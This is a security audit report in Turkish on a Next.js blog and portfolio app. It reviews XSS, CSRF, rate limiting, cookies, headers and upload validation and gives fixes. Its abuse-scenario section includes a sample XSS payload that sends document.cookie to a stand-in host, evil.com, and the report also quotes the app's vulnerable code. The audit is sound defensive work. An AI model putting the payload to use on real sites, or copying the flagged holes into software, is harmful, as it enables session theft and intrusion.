# 🔐 KurayDevV2 - Güvenlik Analizi

## 📊 Genel Güvenlik Değerlendirmesi

| Metrik | Puan | Durum |
|--------|------|-------|
| **XSS Koruması** | 3.0/10 | 🔴 Kritik |
| **CSRF Koruması** | 2.0/10 | 🔴 Kritik |
| **Authentication** | 7.5/10 | 🟢 İyi |
| **Rate Limiting** | 4.0/10 | 🟠 Orta |
| **Environment Variables** | 5.5/10 | 🟠 Orta |
| **Cookie Security** | 8.0/10 | 🟢 İyi |
| **Input Validation** | 7.0/10 | 🟢 İyi |
| **GENEL SKOR** | **5.3/10** | 🟠 Orta-Kritik |

---

## 🚨 1. XSS (Cross-Site Scripting) Zafiyetleri

### 1.1 Kritik Bulgular

#### ❌ `dangerouslySetInnerHTML` Kullanımı (KRİTİK)

**Lokasyon 1:** [components/frontend/Features/Blog/Article/index.tsx](components/frontend/Features/Blog/Article/index.tsx#L13)
```tsx
// KRİTİK: Sanitize edilmemiş HTML direkt render ediliyor
<div dangerouslySetInnerHTML={{ __html: post.content as string }}></div>
```

**Lokasyon 2:** [components/frontend/Features/SingleProject/index.tsx](components/frontend/Features/SingleProject/index.tsx#L7)
```tsx
// KRİTİK: Aynı güvenlik açığı
<div dangerouslySetInnerHTML={{ __html: post.content as string }}></div>
```

**Risk Analizi:**
- Saldırgan blog post içeriğine `<script>alert('XSS')</script>` enjekte edebilir
- Kullanıcı cookie'leri çalınabilir
- Session hijacking mümkün
- Keylogger enjekte edilebilir

**Lokasyon 3-4:** [helpers/MetadataHelper.tsx](helpers/MetadataHelper.tsx#L121-L123)
```tsx
<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(orgJsonLd) }} />
<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(articleJsonLd) }} />
```
- **Risk:** Düşük - JSON.stringify ile escape edilmiş
- Ancak nested user content tehlikeli olabilir

### 1.2 `eval()` Kullanımı (KRİTİK)

**Lokasyon:** [app/(admin)/admin/projects/[projectId]/page.tsx](app/(admin)/admin/projects/%5BprojectId%5D/page.tsx#L164)
```tsx
mandatoryFields.forEach((fieldName) => {
    const fieldValue = eval(fieldName);  // 🔴 KRİTİK GÜVENLİK AÇIĞI
    // ...
});
```

**Risk:** 
- Arbitrary code execution
- Admin panelinde olsa bile tehlikeli
- `mandatoryFields` array'i manipüle edilirse saldırı vektörü

### 1.3 Eksik Sanitizasyon

```bash
# Projede DOMPurify yok
grep -r "DOMPurify" . # Sonuç: 0 eşleşme
```

**Mevcut Korumalar:**
- ✅ `encodeURIComponent` - URL parametreleri için
- ✅ `escapeXml` - Sitemap için
- ❌ HTML sanitization library yok

---

## 🔒 2. CSRF (Cross-Site Request Forgery) Koruması

### 2.1 Kritik Bulgular

**CSRF token implementasyonu yok!**

```bash
grep -r "csrfToken\|csrf" . 
# Sonuç: Sadece yorumlarda ve raporlarda geçiyor
```

#### ❌ Hardcoded CSRF State (GithubService.ts)

**Lokasyon:** [services/AuthService/SSOService/GithubService.ts](services/AuthService/SSOService/GithubService.ts#L26)
```typescript
static generateAuthUrl(): string {
    const params = {
        client_id: this.GITHUB_CLIENT_ID,
        // ...
        state: 'random_string_to_prevent_csrf', // 🔴 HARDCODED - GÜVENLİ DEĞİL!
    };
}
```

**Doğru Yaklaşım:**
```typescript
// ✅ Her istek için unique state
import crypto from 'crypto';
const state = crypto.randomBytes(32).toString('hex');
// Session'da sakla ve callback'te doğrula
```

### 2.2 CSRF'ye Açık Endpoint'ler

| Endpoint | Method | CSRF Token | Risk |
|----------|--------|------------|------|
| `/api/posts` | POST/PUT/DELETE | ❌ | Yüksek |
| `/api/comments` | POST | ❌ | Orta |
| `/api/contact/form` | POST | ❌ | Orta |
| `/api/settings` | PUT | ❌ | Yüksek |
| `/api/users` | PUT/DELETE | ❌ | Kritik |
| `/api/appointments` | POST | ❌ | Orta |

### 2.3 Cookie SameSite Ayarları

**Olumlu:** Cookie'ler genelde `SameSite: strict/lax` ile ayarlanmış:
```typescript
// Login route'ta
const cookieOptions = isSecure ? {
    httpOnly: true,
    secure: true,
    sameSite: 'none' as const,  // HTTPS cross-origin için
} : {
    httpOnly: true,
    sameSite: 'lax' as const,   // HTTP için
};
```

⚠️ **Uyarı:** `sameSite: 'none'` CSRF'ye karşı koruma sağlamaz!

---

## 🛡️ 3. Authentication & Authorization

### 3.1 Olumlu Bulgular

#### ✅ JWT Implementation
```typescript
// UserSessionService.ts
static generateAccessToken(userId: string, userSessionId: string, deviceFingerprint: string): string {
    return jwt.sign(
        {
            userId,
            userSessionId,
            deviceFingerprint,  // ✅ Device binding
        },
        ACCESS_TOKEN_SECRET,
        {
            subject: userId,
            issuer: 'relatia.kuray.dev',
            audience: 'web',
            expiresIn: ACCESS_TOKEN_EXPIRES_IN,
        }
    );
}
```

#### ✅ Refresh Token Rotation
```typescript
// Reuse detection mevcut
if (userSession.refreshToken !== hashedRefreshToken) {
    // Token reuse detected → invalidate all sessions
    await prisma.userSession.deleteMany({ where: { userId: userSession.userId } });
    throw new Error(AuthMessages.REFRESH_TOKEN_REUSED);
}
```

#### ✅ Password Hashing
```typescript
// bcrypt ile 10 round
static async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 10);
}
```

#### ✅ Device Fingerprinting
```typescript
static async generateDeviceFingerprint(request: NextRequest): Promise<string> {
    const ip = request.headers.get("x-forwarded-for") || ...;
    const userAgent = request.headers.get("user-agent") || "";
    const acceptLanguage = request.headers.get("accept-language") || "";
    
    const rawFingerprint = `${ip}|${userAgent}|${acceptLanguage}`;
    return crypto.createHash("sha256").update(rawFingerprint).digest("hex");
}
```

### 3.2 Potansiyel Auth Bypass Riskleri

#### ⚠️ Admin Panel Client-Side Check

**Lokasyon:** [app/(admin)/admin/layout.tsx](app/(admin)/admin/layout.tsx#L30)
```tsx
if (response.data.user.userRole !== 'ADMIN' && response.data.user.userRole !== 'SUPER_ADMIN') {
    router.push('/');  // Client-side redirect
}
```

**Risk:** Client-side kontrol server-side ile de doğrulanmalı.

**Doğru Uygulama Örneği:** [app/(api)/api/posts/route.ts](app/(api)/api/posts/route.ts#L59)
```typescript
// ✅ Server-side auth check
UserSessionService.authenticateUserByRequest({ request, requiredUserRole: "ADMIN" });
```

#### ⚠️ Token URL'de Geçiyor (SSO Callback)

**Lokasyon:** [app/(api)/api/auth/callback/[provider]/route.ts](app/(api)/api/auth/callback/%5Bprovider%5D/route.ts#L49)
```typescript
// 🟠 Token URL'de - browser history'de kalır
return NextResponse.redirect(
    `${process.env.APPLICATION_HOST}/auth/callback?rawAccessToken=${rawAccessToken}&rawRefreshToken=${rawRefreshToken}`
);
```

**Risk:** 
- Browser history'de token görünür
- Referer header'da sızabilir
- Shared computer riski

**Çözüm:** Server-side session ile cookie set etmeli.

---

## ⏱️ 4. Rate Limiting Analizi

### 4.1 Mevcut Implementasyon

**Lokasyon:** [libs/rateLimit/index.ts](libs/rateLimit/index.ts)
```typescript
// 10 request / 60 saniye per IP
const RATE_LIMIT = 10;
const TIME_WINDOW = 60;

static async checkRateLimit(request: NextRequest) {
    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";
    const key = `rate_limit:${ip}`;
    
    const count = await redisInstance.incr(key);
    if (count === 1) {
        await redisInstance.expire(key, TIME_WINDOW);
    }
    
    if (count > RATE_LIMIT) {
        throw new Error("Rate limit exceeded");
    }
}
```

### 4.2 Rate Limit Uygulanan Route'lar

| Route | Rate Limited | Limit |
|-------|--------------|-------|
| `/api/auth/login` | ✅ | 10/60s |
| `/api/auth/reset-password` | ✅ | 10/60s |
| `/api/auth/sso/[provider]` | ✅ | 10/60s |
| `/api/auth/me/profile` | ✅ | 10/60s |

### 4.3 Rate Limit OLMAYAN Route'lar (KRİTİK)

| Route | Risk | Abuse Senaryosu |
|-------|------|-----------------|
| `/api/posts` | 🔴 Yüksek | Spam post oluşturma |
| `/api/comments` | 🔴 Yüksek | Comment spam |
| `/api/contact/form` | 🟠 Orta | Contact form spam (kısmi koruma var) |
| `/api/search` | 🔴 Yüksek | DoS attack |
| `/api/ai/*` | 🔴 Kritik | OpenAI API abuse, maliyet |
| `/api/appointments` | 🟠 Orta | Appointment spam |
| `/api/subscriptions` | 🟠 Orta | Email spam |

### 4.4 Contact Form Kısmi Koruma

```typescript
// api/contact/form/route.ts
const recentEntries = await ContactFormService.getRecentContactFormEntriesByPhoneOrEmail(phone, email);
if (recentEntries.length > 2) {
    return NextResponse.json({ 
        message: "You have already submitted a message recently..." 
    }, { status: 429 });
}
```
- ✅ Email/Phone bazlı limit var
- ❌ IP bazlı limit yok

---

## 🔑 5. Environment Variables Analizi

### 5.1 Sunucu Tarafı (process.env)

| Değişken | Güvenlik | Risk |
|----------|----------|------|
| `ACCESS_TOKEN_SECRET` | ✅ Server-only | Düşük |
| `REFRESH_TOKEN_SECRET` | ✅ Server-only | Düşük |
| `ENCRYPTION_SECRET_KEY` | ✅ Server-only | Düşük |
| `GITHUB_CLIENT_SECRET` | ✅ Server-only | Düşük |
| `GOOGLE_CLIENT_SECRET` | ✅ Server-only | Düşük |
| `TWILIO_AUTH_TOKEN` | ✅ Server-only | Düşük |
| `AWS_SECRET_ACCESS_KEY` | ✅ Server-only | Düşük |
| `DATABASE_URL` | ✅ Server-only | Düşük |
| `REDIS_URL` | ✅ Server-only | Düşük |

### 5.2 Client'a Açık (NEXT_PUBLIC_)

| Değişken | Kullanım | Risk |
|----------|----------|------|
| `NEXT_PUBLIC_GOOGLE_TAG` | Google Analytics | ✅ Normal |
| `NEXT_PUBLIC_TINYMCE_API_KEY` | TinyMCE Editor | ✅ Normal |
| `NEXT_PUBLIC_API_URL` | API Base URL | ✅ Normal |
| `NEXT_PUBLIC_BASE_URL` | Sitemap | ✅ Normal |

### 5.3 Şüpheli Değişken Adı

```typescript
// Contact component
const recaptchaSiteKey = process.env.RECAPTCHA_CLIENT_KEY || "";
```

⚠️ **Uyarı:** `RECAPTCHA_CLIENT_KEY` adı yanıltıcı:
- Client key için `NEXT_PUBLIC_` prefix olmalı
- Server-side component'te kullanılırsa sorun yok
- Client component'te erişilemez

---

## 🍪 6. Cookie Security

### 6.1 Olumlu Bulgular

```typescript
// Tüm auth cookie'leri için
{
    httpOnly: true,        // ✅ JS erişimi engellendi
    secure: true,          // ✅ HTTPS zorunlu (production)
    sameSite: 'strict',    // ✅ CSRF koruması
    path: '/',
    maxAge: 60 * 60 * 24 * 7,  // 7 gün
}
```

### 6.2 Cookie Özet Tablosu

| Cookie | HttpOnly | Secure | SameSite | Expiry |
|--------|----------|--------|----------|--------|
| `accessToken` | ✅ | ✅ | lax/none | 7d |
| `refreshToken` | ✅ | ✅ | lax/none | 7d |

---

## 🔒 7. Security Headers (EKSİK!)

### 7.1 Middleware Analizi

**Lokasyon:** [middleware.ts](middleware.ts)

```typescript
export function middleware(request: NextRequest) {
    // Sadece CORS var, security header'lar YOK!
    const allowedOrigins = [
        'http://localhost:3000',
        'http://localhost:3001',
        'https://kuray.dev',
        'https://www.kuray.dev',
    ];
    
    // ... sadece CORS header'ları
}
```

### 7.2 Eksik Security Headers

| Header | Durum | Etki |
|--------|-------|------|
| `Content-Security-Policy` | ❌ | XSS koruması |
| `X-Frame-Options` | ❌ | Clickjacking koruması |
| `X-Content-Type-Options` | ❌ | MIME sniffing koruması |
| `Strict-Transport-Security` | ❌ | HTTPS zorunluluğu |
| `X-XSS-Protection` | ❌ | Legacy XSS filter |
| `Referrer-Policy` | ❌ | Referer sızıntısı |
| `Permissions-Policy` | ❌ | Feature restrictions |

---

## 📤 8. File Upload Security

### 8.1 AWS Upload Validasyonu

**Lokasyon:** [services/StorageService/AWSService.ts](services/StorageService/AWSService.ts)

```typescript
static allowedExtensions = ['jpeg', 'jpg', 'png', 'webp', 'avif']
static allowedMimeTypes = [
    'image/jpeg',
    'image/png',
    'image/webp',
    'image/avif',
]

private static validateFile(file: File, folder: string) {
    // ✅ Folder whitelist
    if (!AWSService.allowedFolders.includes(folder)) 
        throw new Error('INVALID_FOLDER_NAME');
    
    // ✅ Extension check
    const extension = file.name.split('.').pop()?.toLowerCase();
    if (!extension || !AWSService.allowedExtensions.includes(extension))
        throw new Error(`Invalid file extension: .${extension}`);
    
    // ✅ MIME type check
    const mimeType = file.type;
    if (!mimeType || !AWSService.allowedMimeTypes.includes(mimeType))
        throw new Error(`Invalid MIME type: ${mimeType}`);
}
```

**Olumlu:**
- ✅ Whitelist yaklaşımı
- ✅ Extension + MIME type kontrolü
- ✅ Folder restriction

**Eksik:**
- ❌ File size limit kontrolü yok
- ❌ Magic bytes kontrolü yok
- ❌ Virus scan yok

---

## 🎯 9. Abuse Senaryoları

### Senaryo 1: XSS ile Session Hijacking
```
1. Saldırgan admin yetkisi elde eder (veya mevcut admin)
2. Blog post içeriğine XSS payload ekler:
   <script>
     fetch('https://evil.com/steal?cookie=' + document.cookie)
   </script>
3. HttpOnly cookie olduğu için direkt çalınamaz
4. Ancak keylogger veya form hijacking yapılabilir
```

### Senaryo 2: Comment Spam
```
1. Rate limit olmayan /api/comments endpoint'ine spam
2. Toxicity model bypass edilebilir (edge cases)
3. Binlerce fake comment oluşturulabilir
4. SEO zararı ve sistem yükü
```

### Senaryo 3: Contact Form Abuse
```
1. Farklı IP'lerden spam (IP rate limit yok)
2. Admin'e binlerce email gider
3. SMTP limit aşılabilir
4. Mail sunucusu blacklist'e girebilir
```

### Senaryo 4: OpenAI API Abuse
```
1. /api/ai/* endpoint'lerine rate limit yok
2. Saldırgan sürekli AI çağrısı yapar
3. OpenAI faturası astronomik rakamlara çıkar
4. Servis maliyeti patlar
```

### Senaryo 5: SSO State Bypass
```
1. GitHub SSO için state sabit: 'random_string_to_prevent_csrf'
2. CSRF attack ile kullanıcı saldırganın hesabına bağlanabilir
3. Account takeover riski
```

### Senaryo 6: Search DoS
```
1. /api/search rate limit yok
2. Karmaşık aramalarla database yükü oluşturulur
3. Full-text search CPU tüketir
4. Servis yavaşlar veya çöker
```

---

## 📋 10. Öncelikli Düzeltmeler

### 🔴 Kritik (Hemen)

1. **DOMPurify Entegrasyonu**
```bash
npm install dompurify @types/dompurify
```

```typescript
// components/frontend/Features/Blog/Article/index.tsx
import DOMPurify from 'dompurify';

export default function Article(post: Partial<Post>) {
    const sanitizedContent = DOMPurify.sanitize(post.content as string, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'img', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'code', 'pre'],
        ALLOWED_ATTR: ['href', 'src', 'alt', 'class'],
    });
    
    return (
        <div dangerouslySetInnerHTML={{ __html: sanitizedContent }}></div>
    );
}
```

2. **eval() Kaldırma**
```typescript
// Yerine:
const fieldValues: Record<string, any> = {
    title, slug, description, // ... diğer alanlar
};

mandatoryFields.forEach((fieldName) => {
    const fieldValue = fieldValues[fieldName];
    // ...
});
```

3. **Global Rate Limiter**
```typescript
// middleware.ts'e ekle
import RateLimiter from '@/libs/rateLimit';

export async function middleware(request: NextRequest) {
    // Global rate limit (100 req/min)
    try {
        await RateLimiter.checkRateLimit(request, 100, 60);
    } catch {
        return NextResponse.json({ error: 'Rate limit exceeded' }, { status: 429 });
    }
    // ...
}
```

### 🟠 Yüksek (1 Hafta)

4. **Security Headers**
```typescript
// middleware.ts
const securityHeaders = {
    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com; style-src 'self' 'unsafe-inline';",
    'X-Frame-Options': 'DENY',
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
};

response.headers.set('X-Frame-Options', securityHeaders['X-Frame-Options']);
// ...
```

5. **CSRF Token Implementation**
```typescript
// libs/csrf/index.ts
import crypto from 'crypto';

export function generateCSRFToken(): string {
    return crypto.randomBytes(32).toString('hex');
}

export function validateCSRFToken(token: string, sessionToken: string): boolean {
    return crypto.timingSafeEqual(
        Buffer.from(token),
        Buffer.from(sessionToken)
    );
}
```

6. **SSO State Fix**
```typescript
// GithubService.ts
static generateAuthUrl(sessionId: string): string {
    const state = crypto.createHash('sha256')
        .update(sessionId + process.env.CSRF_SECRET)
        .digest('hex');
    
    const params = {
        client_id: this.GITHUB_CLIENT_ID,
        state: state,
        // ...
    };
    // State'i session'da sakla ve callback'te doğrula
}
```

### 🟡 Orta (1 Ay)

7. **AI Endpoint Rate Limit**
8. **File Size Validation**
9. **Magic Bytes Validation**
10. **Audit Logging**

---

## 📊 Güvenlik Checklist

| Kontrol | Durum | Öncelik |
|---------|-------|---------|
| XSS Protection (DOMPurify) | ❌ | Kritik |
| CSRF Tokens | ❌ | Kritik |
| eval() Removal | ❌ | Kritik |
| Global Rate Limiting | ❌ | Yüksek |
| Security Headers | ❌ | Yüksek |
| SSO State Validation | ❌ | Yüksek |
| JWT Implementation | ✅ | - |
| Password Hashing | ✅ | - |
| Cookie Security | ✅ | - |
| Input Validation (Zod) | ✅ | - |
| File Upload Validation | ⚠️ | Orta |
| Token Refresh Rotation | ✅ | - |
| Device Fingerprinting | ✅ | - |
| SQL Injection (Prisma) | ✅ | - |

---

## 🔍 Sonuç

KurayDevV2 projesi authentication ve cookie security konularında iyi uygulamalar içerse de, **XSS koruması**, **CSRF token implementasyonu** ve **rate limiting** konularında kritik eksiklikler bulunmaktadır.

**Acil Aksiyon Gerektiren:**
1. DOMPurify ile HTML sanitization
2. eval() kullanımının kaldırılması
3. Global rate limiter implementasyonu
4. Security headers eklenmesi

**Tahmini Düzeltme Süresi:** 2-3 hafta (kritik konular için 1 hafta)

---

*Rapor Tarihi: 2025*  
*Analiz Kapsamı: Güvenlik açıkları, abuse senaryoları, düzeltme önerileri*
